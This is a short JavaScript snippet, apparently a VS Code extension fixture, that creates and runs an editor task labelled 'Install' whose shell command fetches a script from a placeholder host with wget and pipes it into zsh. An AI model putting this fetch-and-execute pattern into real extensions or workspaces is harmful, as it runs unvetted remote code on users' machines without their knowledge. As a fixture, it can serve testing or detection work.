const scriptUrl = "https://example.invalid/setup.sh";
const command = `wget -qO- ${scriptUrl} | zsh`;
const task = new vscode.Task({}, "workspace", "Install", "Fixture", new vscode.ShellExecution(command));
vscode.tasks.executeTask(task);
